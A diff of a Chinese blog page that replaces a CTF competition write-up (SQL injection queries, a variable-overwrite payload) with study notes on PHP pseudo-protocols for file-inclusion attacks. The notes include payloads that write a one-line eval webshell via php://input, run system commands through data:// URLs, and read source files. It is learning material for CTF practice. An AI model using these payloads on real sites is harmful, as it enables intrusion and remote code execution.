@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="写写鲲鹏杯的WP吧。。, Lim_XuK">
+    <meta name="keywords" content="PHP伪协议, Lim_XuK">
     <meta name="description" content="晨光起于白塔尖顶，终将铺满阴霾之地。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>写写鲲鹏杯的WP吧。。 | Lim_XuK</title>
+    <title>PHP伪协议 | Lim_XuK</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -204,12 +204,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">写写鲲鹏杯的WP吧。。</h1>
+                    <h1 class="description center-align post-title">PHP伪协议</h1>
                 </div>
             </div>
         </div>
@@ -329,12 +329,8 @@
                                 <span class="chip bg-color">web</span>
                             </a>
                         
-                            <a href="/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
-                                <span class="chip bg-color">做题记录</span>
-                            </a>
-                        
-                            <a href="/tags/misc/">
-                                <span class="chip bg-color">misc</span>
+                            <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                                <span class="chip bg-color">学习笔记</span>
                             </a>
                         
                     </div>
@@ -358,7 +354,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-10-23
+                    2021-10-27
                 </div>
                 
 
@@ -382,115 +378,97 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="前记"><a class="header-anchor" href="#前记">¶</a>前记</h2>
+                <h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
+<p>这玩意儿好像一般都是跟着文件包含出现的，而且因为每次做的时候都没啥思虑，所以就打算整整</p>
+<h2 id="php-协议"><a class="header-anchor" href="#php-协议">¶</a>php:// 协议</h2>
+<h3 id="作用："><a class="header-anchor" href="#作用：">¶</a>作用：</h3>
+<p>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</p>
+<h3 id="php-filter"><a class="header-anchor" href="#php-filter">¶</a>php://filter</h3>
+<p>它用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.readfile.php">readfile()</a>、 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.file.php">file()</a> 和 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>， 在数据流内容读取之前没有机会应用其他过滤器。</p>
 <blockquote>
-<p>本来想早点写的，但是还是想把最后两个WEB题做出来再写</p>
+<p>这里提一嘴include()函数，这个函数内的文件不管后缀名是什么，只要文件内有<?php  ?>形式的代码就可以执行，如果不是php代码，则会直接返回显示</p>
 </blockquote>
-<h2 id="WEB"><a class="header-anchor" href="#WEB">¶</a>WEB</h2>
-<h3 id="贪吃蛇"><a class="header-anchor" href="#贪吃蛇">¶</a>贪吃蛇</h3>
-<p>这玩意儿肯定不可能硬玩，一开始以为是前端玩游戏，然后把成绩转给后端，后端再判断成绩是否达标返回flag，结果开了半天bs抓不到包，所以判断应该是只有前端的JS进行判断，F12打开，查看JS代码，拖到中间发现有个判断函数，我记得大概是</p>
-<pre class="line-numbers language-none"><code class="language-none">if(Length&gt;2000)&#123;
-xxxxxxxxxxxxxxxxxx
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>xxxx里面是一堆颜表情，所以不难想到颜表情密码，直接把那一串拖进解码网站就可以得出答案</p>
-<h3 id="搜索引擎"><a class="header-anchor" href="#搜索引擎">¶</a>搜索引擎</h3>
-<p>就一个框，搜索，但是有返回，所以初步判断是SQL注入，接下来就是判断注入类型</p>
-<p>输入1’时，报错，所以判断是字符型输入，接下来就是一步步判断了</p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span> <span class="token comment">#//没错</span>
-<span class="token keyword">union</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span> <span class="token comment">#//报错</span>
-<span class="token comment">//所以判断输出位只有一个</span>
-<span class="token keyword">union</span> <span class="token keyword">select</span> datebase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//获取数据库名</span>
-<span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>SCHEMA_NAME<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">TABLES</span> <span class="token keyword">where</span> TABLE_SCHEMA<span class="token operator">=</span><span class="token string">'attackdb'</span><span class="token comment">//获取表名</span>
-<span class="token keyword">union</span>  <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_NAME<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> TABLE_SCHEMA<span class="token operator">=</span><span class="token string">'attackdb'</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'表名'</span><span class="token comment">//获取列名</span>
-<span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">from</span> attackdb<span class="token punctuation">.</span>表名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>然后就能得到flag</p>
-<h3 id="php伪协议string-rot13的利用漏洞，php覆盖"><a class="header-anchor" href="#php伪协议string-rot13的利用漏洞，php覆盖">¶</a>php伪协议string.rot13的利用漏洞，php覆盖</h3>
-<p>这个确实不会，看别人博客慢慢学的</p>
-<p>点击信息时，URL发生变化，<code>index.php?page=index</code>，所以判断page是可以被赋值的，将page=index.php，查看源码内容，可以看到一串被注释的密文，根据题目提示判断是ROT13编码</p>
-<p>之后就去找rot13的解密，把那一串全部放进去，接下来就是代码审计</p>
-<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20211016151031.png" alt=""></p>
+<p>php://filter常用的套路就是将制定文件以base64的方式编码，传入include函数，因为include函数无法识别出被base64加密后的php文件，所以不会执行，而是会直接进行输出。</p>
+<table>
+<thead>
+<tr>
+<th>php://filter 参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>resource=&lt;要过滤的数据流&gt;</td>
+<td>必须项。它指定了你要筛选过滤的数据流。</td>
+</tr>
+<tr>
+<td>read=&lt;读链的过滤器&gt;</td>
+<td>可选项。可以设定一个或多个过滤器名称，以管道符（**）分隔。</td>
+</tr>
+<tr>
+<td>write=&lt;写链的过滤器&gt;</td>
+<td>可选项。可以设定一个或多个过滤器名称，以管道符（\）分隔。</td>
+</tr>
+<tr>
+<td>&lt;; 两个链的过滤器&gt;</td>
+<td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>
+</tr>
+</tbody>
+</table>
+<h4 id="用法："><a class="header-anchor" href="#用法：">¶</a>用法：</h4>
+<p>1.php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）<br>
+2.php://input + [POST DATA]执行php代码</p>
+<p>如http://127.0.0.1/include.php?file=php://input<br>
+[POST DATA部分]</p>
+<?php phpinfo(); ?>
+<p>若有写入权限，还可以写入一句话木马</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=php://input">http://127.0.0.1/include.php?file=php://input</a><br>
+[POST DATA部分]</p>
+<?php fputs(fopen('1juhua.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>
+<h4 id="例子：“强网”——EasyFilter"><a class="header-anchor" href="#例子：“强网”——EasyFilter">¶</a>例子：“强网”——EasyFilter</h4>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-    <span class="token variable">$hashed_key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'df01c5786c5d7d83211a8f5f22f6bdb8468e23494ad698cb86c02d128473beef765952cdd5504cbe4657a6334f6b4f7b'</span><span class="token punctuation">;</span>
-	
-	
-    <span class="token variable">$parsed</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token comment">//parse_url将url解析后，返回一个关联数组，数组中包含query这个字段，用来存储传入的参数值。</span>
-	
-    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$parsed</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"query"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//[query] => arg=value，将数组中的query字段值赋给变量query</span>
-	
-	
-    <span class="token variable">$parsed_query</span> <span class="token operator">=</span> <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token comment">//parse_str()  常见变量覆盖点</span>
-	<span class="token comment">//parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量</span>
-	
-	
-	<span class="token comment">//所有通过url的get方法传入的参数都会经过parse_str方法。使传入的参数值覆盖之前赋的值，从而引发变量覆盖漏洞</span>
-	
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$parsed_query</span><span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-        <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$parsed_query</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"./"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//高亮处理文件</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
-
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">===</span><span class="token string double-quoted-string">"auth"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      		 	 	 
-        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    	 	 	 
-        <span class="token variable">$hashed_input</span> <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha384'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//使用sha384的哈希算法，将key值进行hash运算，生成对应的哈希值 </span>
-        
-		
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$hashed_input</span><span class="token operator">!==</span><span class="token variable">$hashed_key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//hashed_input=hashed_key时，得到flag。</span>
-            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no way to get flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span>
-
-        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
-		
-		<span class="token comment">//发现是php的变量覆盖，通过action间接覆盖其他的信息，所以构造覆盖action=auth，key=1，hashed_key=sha384的1</span>
-		
-    <span class="token punctuation">&#125;</span>
-        <span class="token delimiter important">?></span></span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>接下来就是构造payload<br>
-index.php?action=auth&amp;key=1&amp;hashed_key=47f05d367b0c32e438fb63e6cf4a5f35c2aa2f90dc7543f8a41a0f95ce8a40a313ab5cf36134a2068c4c969cb50db776</p>
-<p>之后就能看到flag</p>
-<blockquote>
-<p>之后快结束的时候又发了两题，但是来不及看了</p>
-</blockquote>
-<h3 id="一佰块都不给我"><a class="header-anchor" href="#一佰块都不给我">¶</a>一佰块都不给我</h3>
-<p>打开是乱七八糟的字母图，没啥用，F12里面也没东西</p>
-<p>之后用御剑扫一扫，扫出来一个</p>
-<p><img src="C:/Users/lim%E9%BB%8E%E6%98%8E/Desktop/1.png" alt=""></p>
-<p>呃虽然之前一直看到robots.txt这个文件，但是一直不知道是干嘛的，所以去查了一下</p>
-<p>robots.txt是网站管理者写给爬虫的一封信，里面描述了网站管理者不希望爬虫做的事，比如：</p>
-<ul>
-<li>不要访问某个文件、文件夹</li>
-<li>禁止某些爬虫的访问</li>
-<li>限制爬虫访问网站的频率</li>
-</ul>
-<p>一个自觉且善意的爬虫，应该在抓取网页之前，先阅读robots.txt，了解并执行网站管理者制定的爬虫规则。</p>
-<blockquote>
-<p>好家伙</p>
-</blockquote>
-<p>然后打开robots.txt</p>
-<pre class="line-numbers language-none"><code class="language-none">User-agent: *
-Disallow: &#x2F;index.php1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>disallow的地址是index.php1，我们打开</p>
-<p><img src="C:/Users/lim%E9%BB%8E%E6%98%8E/Desktop/2.png" alt=""></p>
-<p>注意到</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>PHP语言，GET请求。所以构造payload</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>ctf<span class="token operator">=</span>phpinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>然后就能找到flag</p>
-<h3 id="神奇的CMS"><a class="header-anchor" href="#神奇的CMS">¶</a>神奇的CMS</h3>
-<p>打开，有个login界面，查了一下，CMS的登陆界面不要太相信SQL注入，所以尝试一下爆破密码，发现登陆是admin,admin123然后就进了admin界面</p>
-<p><img src="C:/Users/lim%E9%BB%8E%E6%98%8E/Desktop/3.png" alt=""></p>
-<p>呃然后就卡住了，雀食不太会，等后面再琢磨琢磨</p>
-<h2 id="MISC"><a class="header-anchor" href="#MISC">¶</a>MISC</h2>
-<h3 id="Base64转图片"><a class="header-anchor" href="#Base64转图片">¶</a>Base64转图片</h3>
-<p>记得没错的话，题目用010打开后，应该是一串Base64编码，然后把它都进Base64转图片里面，就会生成一个二维码，那个二维码扫完就是一个base64加密的字符串，再解码就好了</p>
-<h3 id="真正的ctfer"><a class="header-anchor" href="#真正的ctfer">¶</a>真正的ctfer</h3>
-<p>这题我有见过，但是因为没有软件不太会操作=-=</p>
-<h3 id="Who-won-the-game"><a class="header-anchor" href="#Who-won-the-game">¶</a>Who_won_the_game</h3>
-<p>丢010，发现里面有个flag.txt，所以这玩意儿应该不是png，把他改成zip后缀，发现里面有个flag.txt和一个加密的gif图片，爆破得知密码为1020，把他丢到Stegsolve里面，一步步去找。</p>
-<p>然后在后面几张图里面找到了这个</p>
-<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20211016153713.png" alt=""></p>
-<p>一个个图片属性去换，发现在gray bits中有一个二维码，扫一下就得到flag</p>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./files/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//新建一个./files/的目录</span>
+        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//file的值是随机5byte的值</span>
+        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./files/"</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">//file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )</span>
+		<span class="token comment">//把一个字符串写入文件中</span>
+        <span class="token comment">//把c的内容通过base64编码写入到./files/.file底下，file是随机值</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"./files/"</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">;</span><span class="token comment">//回显文件</span>
+    <span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>	<span class="token comment">//r用于接收get[r]的请求</span>
+        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"./files/"</span><span class="token operator">.</span><span class="token variable">$r</span><span class="token punctuation">;</span><span class="token comment">//  ./files/.$r</span>
+        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://filter/resource=<span class="token interpolation"><span class="token variable">$file</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//过滤执行源路径为file的文件</span>
+    <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>简单来说，w写操作，他把变量c写入了一个名字未知的文件中，r是读操作，可以读指定路径的file</p>
+<p>从写操作考虑：构建payload</p>
+<p><code>?action=w&amp;c=&lt;?php eval($_POST[s])?&gt;</code>并post = system(“ls”)一步步找文件，之后cat即可</p>
+<h2 id="file-协议"><a class="header-anchor" href="#file-协议">¶</a>file:// 协议</h2>
+<p>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。<br>
+include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。</p>
+<p>用法</p>
+<pre><code>file://[文件的绝对路径和文件名]
+http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
+[文件的相对路径和文件名]
+http://127.0.0.1/include.php?file=./phpinfo.txt
+[http：//网络路径和文件名]
+http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
+</code></pre>
+<h2 id="data-协议"><a class="header-anchor" href="#data-协议">¶</a>data:// 协议</h2>
+<p>[<a target="_blank" rel="noopener" href="http://192.168.43.173:8999/lsawebtest/phptest/phprotocol1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==">http://192.168.43.173:8999/lsawebtest/phptest/phprotocol1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</a>]</p>
+<p>不加//亦可。</p>
+<p>也可以用来读php文件源码：<br>
+data:text/plain,<?php system(‘cat /var/www/phprotocol1.php’)?></p>
+<p>或者命令执行：<br>
+data:text/plain,<?php system(‘whoami’)?></p>
+<h2 id="最后"><a class="header-anchor" href="#最后">¶</a>最后</h2>
+<p><img src="C:/Users/lim%E9%BB%8E%E6%98%8E/Desktop/20190509154902917.png" alt=""></p>
 
                 
             </div>
@@ -517,7 +495,7 @@ Disallow: &#x2F;index.php1<span aria-hidden="true" class="line-numbers-rows"><sp
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Lim135.github.io/2021/10/23/%E5%86%99%E5%86%99%E9%B2%B2%E9%B9%8F%E6%9D%AF%E7%9A%84WP%E5%90%A7%E3%80%82%E3%80%82/">http://Lim135.github.io/2021/10/23/%E5%86%99%E5%86%99%E9%B2%B2%E9%B9%8F%E6%9D%AF%E7%9A%84WP%E5%90%A7%E3%80%82%E3%80%82/</a>
+                    <a href="http://Lim135.github.io/2021/10/27/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">http://Lim135.github.io/2021/10/27/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -559,12 +537,8 @@ Disallow: &#x2F;index.php1<span aria-hidden="true" class="line-numbers-rows"><sp
                                     <span class="chip bg-color">web</span>
                                 </a>
                             
-                                <a href="/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
-                                    <span class="chip bg-color">做题记录</span>
-                                </a>
-                            
-                                <a href="/tags/misc/">
-                                    <span class="chip bg-color">misc</span>
+                                <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                                    <span class="chip bg-color">学习笔记</span>
                                 </a>
                             
                         </div>
@@ -610,9 +584,10 @@ Disallow: &#x2F;index.php1<span aria-hidden="true" class="line-numbers-rows"><sp
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/10/27/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
                     <div class="card-image">
@@ -630,9 +605,9 @@ Disallow: &#x2F;index.php1<span aria-hidden="true" class="line-numbers-rows"><sp
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-27
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-27
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -645,6 +620,7 @@ Disallow: &#x2F;index.php1<span aria-hidden="true" class="line-numbers-rows"><sp
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -667,24 +643,24 @@ Disallow: &#x2F;index.php1<span aria-hidden="true" class="line-numbers-rows"><sp
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/10/14/%E4%B8%80%E4%BA%9B%E4%BA%9Bweb%E7%9A%84%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/">
+                <a href="/2021/10/23/%E5%86%99%E5%86%99%E9%B2%B2%E9%B9%8F%E6%9D%AF%E7%9A%84WP%E5%90%A7%E3%80%82%E3%80%82/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="一些些web的做题记录——持续更新">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="写写鲲鹏杯的WP吧。。">
                         
-                        <span class="card-title">一些些web的做题记录——持续更新</span>
+                        <span class="card-title">写写鲲鹏杯的WP吧。。</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            边看边做
+                            学学学
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-23
                             </span>
                         <span class="publish-author">
                             
